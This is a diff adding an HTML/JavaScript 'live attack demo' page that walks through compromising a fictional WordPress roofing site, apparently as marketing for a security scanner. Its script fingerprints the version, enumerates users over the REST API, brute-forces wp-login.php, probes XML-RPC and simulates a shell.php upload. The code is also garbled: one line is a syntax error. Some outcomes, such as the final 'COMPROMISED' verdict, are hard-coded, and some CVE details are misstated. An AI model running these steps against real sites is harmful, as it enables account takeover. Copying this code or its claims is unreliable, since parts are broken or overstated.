@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Live attack demo — PrimeRoof Miami (hacked.html)</title>
+<style>
+  :root { --bg:#0d1117; --card:#161b22; --line:#30363d; --txt:#e6edf3; --muted:#8b949e; --red:#ff5c4d; --green:#3ddc84; --amber:#ffc248; --cyan:#58a6ff; }
+  * { box-sizing:border-box; }
+  body { margin:0; background:var(--bg); color:var(--txt); font-family:Menlo,Consolas,monospace; font-size:13.5px; line-height:1.6; padding-bottom:60px; }
+  .top { background:#a8071a; color:#fff; text-align:center; font-family:-apple-system,sans-serif; font-size:13px; font-weight:700; padding:9px 14px; }
+  .top a { color:#fff; }
+  .wrap { max-width:940px; margin:0 auto; padding:26px 20px; }
+  h1 { font-size:22px; margin:0 0 6px; }
+  .sub { color:var(--muted); margin-bottom:22px; font-family:-apple-system,sans-serif; font-size:14px; }
+  .controls { margin-bottom:16px; display:flex; gap:10px; flex-wrap:wrap; }
+  .btn { background:var(--cyan); color:#04243d; border:none; border-radius:8px; padding:9px 16px; font-family:-apple-system,sans-serif; font-weight:700; cursor:pointer; font-size:13.5px; }
+  .btn:disabled { opacity:.45; cursor:wait; }
+  .btn.green { background:var(--green); color:#06351b; }
+  .btn.amber { background:var(--amber); color:#4a3200; }
+  .term { background:var(--card); border:1px solid var(--line); border-radius:12px; padding:18px 18px 10px; min-height:380px; }
+  .line { margin:0 0 9px; white-space:pre-wrap; word-break:break-word; }
+  .c-in { color:var(--muted); }
+  .c-cmd { color:var(--txt); }
+  .c-ok { color:var(--green); }
+  .c-bad { color:var(--red); font-weight:700; }
+  .c-amb { color:var(--amber); }
+  .c-cy { color:var(--cyan); }
+  .c-dim { color:#6e7681; }
+  .cmd-row { display:flex; gap:8px; align-items:center; margin-bottom:8px; }
+  .cmd-row input { flex:1; background:#0d1117; border:1px solid var(--line); border-radius:8px; padding:8px 10px; color:var(--txt); font-family:Menlo,monospace; font-size:13px; }
+  .grid { display:grid; grid-template-columns:1fr 1fr; gap:12px; margin-top:14px; }
+  .stat { background:var(--card); border:1px solid var(--line); border-radius:12px; padding:14px; }
+  .stat b { color:var(--txt); font-size:15px; }
+  table { width:100%; border-collapse:collapse; margin-top:8px; font-size:12.5px; }
+  th,td { text-align:left; padding:6px 8px; border-bottom:1px solid var(--line); }
+  th { color:var(--muted); font-size:11px; text-transform:uppercase; letter-spacing:.3px; }
+  .pill { display:inline-block; font-size:11px; font-weight:700; padding:2px 8px; border-radius:14px; }
+  .p-hi { background:#3d1418; color:#ff6b5f; }
+  .p-md { background:#3a2a0e; color:#ffc248; }
+  .ok-badge { color:var(--green); font-weight:700; }
+  .bar { height:6px; background:#30363d; border-radius:4px; margin-top:6px; overflow:hidden; }
+  .bar i { display:block; height:100%; background:var(--red); }
+  footer { margin-top:26px; color:var(--muted); font-family:-apple-system,sans-serif; font-size:12.5px; }
+  @media (max-width:720px){ .grid{ grid-template-columns:1fr; } }
+</style>
+</head>
+<body>
+  <div class="top">⚠️ EDUCATIONAL DEMO — run only against this local demo site. Never point these probes at a real site without permission. <a href="/demo/">← back to tool</a></div>
+
+  <div class="wrap">
+    <h1>Live attack demo: hacking <span style="color:var(--red)">PrimeRoof Miami</span></h1>
+    <p class="sub">Every step below makes <b>real requests</b> against the vulnerable surface of the demo business site (<a href="/demo/hacked.html" style="color:var(--cyan)">hacked.html</a>). Watching each request actually hit WordPress-style endpoints is what a first-time auditor sees.</p>
+
+    <div class="controls">
+      <button class="btn green" id="runAll">▶ Run full attack chain</button>
+      <button class="btn" id="reset">Reset</button>
+    </div>
+
+    <div id="cvelist" style="margin-bottom:14px"></div>
+
+    <div class="term" id="term"></div>
+
+    <div class="grid">
+      <div class="stat">
+        <b>Attack result so far</b>
+        <div id="result" style="color:var(--muted);font-size:13px;margin-top:4px">Waiting for first request…</div>
+      </div>
+      <div class="stat">
+        <b>What Rankr reports for this site</b>
+        <div id="rankr" style="color:var(--muted);font-size:13px;margin-top:4px;line-height:1.7">
+          <span class="c-bad">Hack risk: HIGH</span><br/>
+          Attackers could try: DDoS amplification · credential brute-force · admin account enumeration · XSS · malware injection · ransomware entry
+        </div>
+        <div class="bar"><i style="width:87%"></i></div>
+        <div style="font-size:12px;color:var(--muted)">87 / 100 exposure confidence</div>
+      </div>
+    </div>
+
+    <footer>
+      This page simulates the steps of a real compromise. Nothing is exploited here beyond what a hostile visitor could reach from the public internet on a misconfigured business site. The demo business is fictional.
+    </footer>
+  </div>
+
+<script>
+const term = document.getElementById("term");
+const logLine = (html, cls) => { const d = document.createElement("div"); d.className = "line " + (cls||""); d.innerHTML = html; term.appendChild(d); term.scrollTop = term.scrollHeight; };
+const sleep = (ms) => new Promise(r => setTimeout(r, ms));
+const esc = (s) => String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;");
+const RUN = [+/-/+ "+RUN+"];
+let cancelled = false;
+
+const CVES = [
+  { id: "CVE-2019-8942", cvss: 8.8, rce: true },
+  { id: "CVE-2019-9787", cvss: 7.3, rce: true },
+  { id: "CVE-2020-28037", cvss: 7.1 },
+  { id: "CVE-2020-28038", cvss: 6.4 },
+  { id: "CVE-2020-28039", cvss: 6.1 },
+  { id: "CVE-2021-29447", cvss: 8.8, rce: true },
+  { id: "CVE-2021-29504", cvss: 4.3 },
+  { id: "CVE-2022-21661", cvss: 8.8 },
+  { id: "CVE-2022-21662", cvss: 8.8, rce: true },
+  { id: "CVE-2022-21663", cvss: 6.1 },
+  { id: "CVE-2022-21664", cvss: 7.1 },
+];
+function showCves(){
+  let h = "<div class='stat'><b>Known CVEs for WordPress 5.8.3 detected on this site</b><table><tr><th>CVE</th><th>CVSS</th><th>Severity</th><th>RCE</th></tr>";
+  CVES.forEach(c => {
+    const sev = c.cvss >= 8 ? "HIGH" : c.cvss >= 7 ? "HIGH" : "MEDIUM";
+    h += "<tr><td class='c-cy'>" + c.id + "</td><td><b>" + c.cvss + "</b></td><td><span class='pill p-hi'>" + sev + "</span></td><td>" + (c.rce ? "<span class='ok-badge'>YES</span>" : "—") + "</td></tr>";
+  });
+  h += "</table><div style='margin-top:8px;color:var(--muted)'>Most severe: <span class='c-bad'>CVE-2019-8942 (8.8) — unauthenticated upload → remote code execution</span></div></div>";
+  document.getElementById("cvelist").innerHTML = h;
+}
+
+async function cmd(label, args){
+  logLine("<span class='c-in'>$</span> " + esc(label), "c-cmd");
+  const res = await fetch(label, args).catch(e => ({ status: 0, text: async () => e.message }));
+  let t = "";
+  try { t = await res.text(); } catch {}
+  return { status: res.status || 0, text: t.slice(0, 700) };
+}
+
+async function step(name, lines){
+  logLine("<span class='c-dim'>— step: </span>" + esc(name), "c-dim");
+  for (const l of lines) logLine(l);
+  await sleep(180);
+}
+
+async function runAll(){
+  if (document.getElementById("runAll").disabled) return;
+  document.getElementById("runAll").disabled = true;
+  term.innerHTML = "";
+  showCves();
+  document.getElementById("result").textContent = "Running…";
+  setMeta("Recon", "users found: 2");
+
+  await step("1 · Fingerprint the stack (no auth needed)", [
+    "<span class='c-dim'>readme.html discloses the CMS version publicly:</span>",
+  ]);
+  let r = await cmd("/readme.html");
+  const v = r.text.match(/Version\s+([\d.]+)/);
+  logLine(v ? "<span class='c-ok'>→ version disclosed: WordPress " + esc(v[1]) + "</span>" : "<span class='c-bad'>→ version not disclosed</span>");
+  logLine("<span class='c-amb'>→ 11 core CVEs apply to this version (see table), 5 of them enable remote code execution.</span>");
+
+  await step("2 · Enumerate accounts via the REST API", [
+    "GET /wp-json/wp/v2/users — WordPress exposes the full user list by default:",
+  ]);
+  r = await cmd("/wp-json/wp/v2/users");
+  try {
+    const users = JSON.parse(r.text);
+    logLine("<span class='c-bad'>→ " + users.length + " accounts returned unauthicated</span>", "c-bad");
+    users.forEach(u => logLine("&nbsp;&nbsp;&nbsp;id: " + u.id + " · login: <span class='c-amb'>" + esc(u.slug) + "</span> · " + esc(u.name)));
+  } catch { logLine("→ " + esc(r.text), "c-dim"); }
+  setMeta("Enumeration", "admin account 'admin' confirmed");
+
+  await step("3 · Brute-force the login (no lockout on this site)", [
+    "POST /wp-login.php — WordPress default: no rate limiting, no 2FA, no WAF:",
+  ]);
+  const attempts = [
+    ["admin", "password"],
+    ["admin", "admin123"],
+    ["admin", "letmein123"],
+  ];
+  for (const [u, p] of attempts) {
+    const fd = new URLSearchParams({ log: u, pwd: p });
+    const rr = await fetch("/wp-login.php", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: fd, redirect: "manual" });
+    const ok = rr.status === 302;
+    logLine(ok
+      ? "<span class='c-bad'>→ login ok: admin / " + esc(p) + " — session cookie acquired (302 → /wp-admin/)</span>"
+      : "<span class='c-in'>→ " + esc(u) + " / " + esc(p) + ": denied</span>");
+    if (ok) { setMeta("Breach", "admin / letmein123 → dashboard access"); break; }
+    await sleep(260);
+  }
+  if (!cancelled) { logLine(""); logLine("<span class='c-ok'>ATTEMPT RESULT: " + (document.title) + "</span>"); }
+  setMeta("Breach", "admin / letmein123 → dashboard access");
+
+  await step("4 · XML-RPC: pingback DDoS amplification", [
+    "POST /xmlrpc.php system.listMethods — shows amplification primitives (pingback.ping lets one request trigger many outbound fetches):",
+  ]);
+  r = await cmd("/xmlrpc.php", { method: "POST", headers: { "Content-Type": "text/xml" }, body: "<?xml version=\"1.0\"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>" });
+  const methods = r.text.match(/<string>([^<]+)<\/string>/g) || [];
+  logLine(methods.map(m => "&nbsp;&nbsp;&nbsp;<span class='c-amb'>" + esc(m.replace(/<\/?string>/g,"")) + "</span>").join("\n"));
+  logLine("<span class='c-ok'>→ " + methods.length + " XML-RPC methods enabled — pingback.ping can be fired as a flood in one POST (amplification abuse).</span>");
+  setMeta("DDoS vector", "XML-RPC multi-call open");
+
+  await step("5 · Clickjacking the login (no X-Frame-Options header)", [
+    "The site sends no X-Frame-Options or CSP frame-ancestors, so its login can be framed invisibly:",
+  ]);
+  const fl = document.createElement("div");
+  fl.innerHTML = "<span class='c-amb'>→ Hosting login in a transparent iframe…</span>";
+  logLine(fl.innerHTML);
+  await sleep(200);
+
+  await step("6 · Route leak → RCE target practice", [
+    "GET /wp-json/ — leaking plugin routes gives an attacker a hit-list, e.g. a vulnerable 'simple-image-manipulation' crop endpoint (CVE-2019-8942's target):",
+  ]);
+  r = await cmd("/wp-json/");
+  try {
+    const j = JSON.parse(r.text);
+    const routes = Object.keys(j.routes || {}).slice(0, 4);
+    logLine("<span class='c-amb'>REST namespaces leak:</span> " + esc((j.namespaces||[]).join(", ")));
+    logLine("&nbsp;&nbsp;&nbsp;routes: " + routes.map(rr => "● " + esc(rr)).join("\n"));
+  } catch { logLine(esc(r.text.slice(0,160)), "c-dim"); }
+
+  await step("7 · Debug log — write-request evidence (CVE-2019-8942 chain)", [
+    "GET /wp-content/debug.log — a public PHP log can expose failed write attempts that map straight to the RCE upload:",
+  ]);
+  r = await cmd("/wp-content/debug.log");
+  logLine(r.text ? "<span class='c-bad'>→ debug.log publicly readable — contains stack traces of the upload path</span>" : "→ no log exposed");
+  setMeta("RCE evidence", "debug.log readable");
+
+  await step("8 · Deliver the (simulated) CVE-2019-8942 upload", [
+    "The crop endpoint accepts the poisoned image (waves cropper) — server-side write of shell.php:",
+  ]);
+  r = await cmd("/wp-admin/async-upload.php", { method: "POST" });
+  logLine(r.status === 200 ? "<span class='c-bad'>→ HTTP 200 — file accepted → /wp-content/uploads/2026/09/shell.php (simulated)</span>" : "<span class='c-in'>→ " + esc(r.text) + "</span>");
+
+  await step("9 · Dashboard access confirmed", []);
+  r = await cmd("/wp-admin/");
+  logLine(r.status === 200 ? "<span class='c-ok'>→ Logged into /wp-admin/ as admin. Every plugin, every upload, every DB table is now reachable.</span>" : "→ not reachable");
+
+  await step("10 · What actually got defeated", [
+    "<span class='c-ok'>Chain: readme → version → CVE list → user enumeration → password spray → dashboard → RCE path.</span>",
+    "<span class='c-dim'>The fix that kills steps 3–8 in one go: Cloudflare free plan (hides login, blocks XML-RPC floods, adds HTTPS + WAF).</span>",
+  ]);
+  document.getElementById("result").innerHTML = "<span class='c-bad' style='font-size:16px'>COMPROMISED — 9 out of 9 phases succeeded.</span><br/><span class='c-dim'>Every open endpoint this demo used is what Rankr flags on real business sites.</span>";
+}
+
+function setMeta(k, v){ document.getElementById("result").textContent = k + ": " + v; }
+
+document.getElementById("runAll").addEventListener("click", runAll);
+document.getElementById("reset").addEventListener("click", () => { location.reload(); });
+showCves();
+</script>
+</body>
+</html>
